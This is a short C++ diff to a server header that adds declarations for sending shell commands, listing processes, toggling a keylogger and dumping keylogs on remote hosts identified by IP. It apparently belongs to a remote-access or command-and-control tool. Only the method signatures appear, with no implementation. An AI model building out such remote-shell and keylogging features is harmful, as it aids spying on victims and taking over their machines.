@@ -28,6 +28,12 @@ public:
     void run();    // select() loop
     void stop();
 
+    // Command Dispatch (Thread-safe slots)
+    void sendShellCommand(const QString& ip, const QString& cmd);
+    void requestProcessList(const QString& ip);
+    void toggleKeylogger(const QString& ip, bool active);
+    void requestKeylogDump(const QString& ip);
+
     // Getters
     [[nodiscard]] bool     isRunning() const;
     [[nodiscard]] uint16_t getPort()   const;
